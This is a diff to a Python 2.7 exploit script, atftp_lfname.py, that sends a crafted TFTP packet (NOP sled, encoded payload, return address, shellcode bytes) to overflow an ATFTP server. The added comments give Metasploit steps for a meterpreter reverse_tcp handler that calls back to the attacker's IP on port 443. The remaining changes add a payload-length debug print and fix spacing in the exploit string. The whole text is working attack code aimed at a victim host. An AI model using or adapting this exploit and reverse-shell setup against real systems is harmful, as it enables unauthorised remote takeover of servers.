@@ -4,6 +4,15 @@
 # python 2.7
 import sys, socket, binascii, subprocess, os
 
+
+## Using meterpreter for initial payload, run this prior to this python file
+## sudo msfconsole
+## use multi/handler
+## set payload windows/meterpreter/reverse_tcp
+## set LHOST <Attacker IP>
+## set LPORT 443
+## exploit -j
+
 # to run 'python atftp_lfname.py <victim IP> <victim Port> <attacker IP>'
 
 if len(sys.argv) < 4:
@@ -74,6 +83,9 @@ rv = os.system(cmd)
 payEncoded = open(payEncodedName, "rb")
 encodedPL = payEncoded.read()
 payEncoded.close()
+if len(encodedPL) > 210:
+    print encodedPL
+    print len(encodedPL)
 
 #cleanup files
 try:
@@ -84,7 +96,7 @@ except:
 
 #let's make the payload encoded
 
-exploit = "\x00\x02" + nop +encodedPL + ret + "\x83\xc4\x28\xc3\x00netascii\x00"
+exploit = "\x00\x02" + nop + encodedPL + ret + "\x83\xc4\x28\xc3\x00netascii\x00"
 
 ## create socket and send
 
